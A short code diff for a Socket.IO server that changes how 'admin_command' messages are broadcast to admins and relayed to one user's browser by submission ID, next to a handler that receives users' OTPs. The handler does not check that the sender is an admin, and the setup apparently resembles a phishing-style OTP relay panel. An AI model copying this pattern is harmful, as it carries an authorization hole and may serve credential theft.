@@ -69,28 +69,18 @@ io.on('connection', (socket) => {
 
   // Handler for commands from an admin
   socket.on('admin_command', (payload) => {
-    
-    // Get the target socket ID from the payload
+    // First, broadcast the command to all admins to keep their UIs synchronized.
+    io.to('admins').emit('admin_command', payload);
+
+    // Then, send the command to the specific target client, if one is specified.
     const targetSocketId = payload.submission_id;
-    
-    if (!targetSocketId) {
-      console.log('No target socket ID provided, broadcasting to all users');
-      // Broadcast to all users except admins
-      io.to('admins').emit('admin_command', payload);
-      return;
+    if (targetSocketId) {
+      const targetSocket = io.sockets.sockets.get(targetSocketId);
+      if (targetSocket) {
+        // Relay the command to the specific user's browser
+        targetSocket.emit('admin_command', payload);
+      }
     }
-
-    // Get the target socket
-    const targetSocket = io.sockets.sockets.get(targetSocketId);
-    
-    if (!targetSocket) {
-      console.log('Target socket not found:', targetSocketId);
-      return;
-    }
-
-    // Send command to specific user
-    console.log('Sending command to target socket:', targetSocketId);
-    targetSocket.emit('admin_command', payload);
   });
 
   // Handler for OTPs from a user
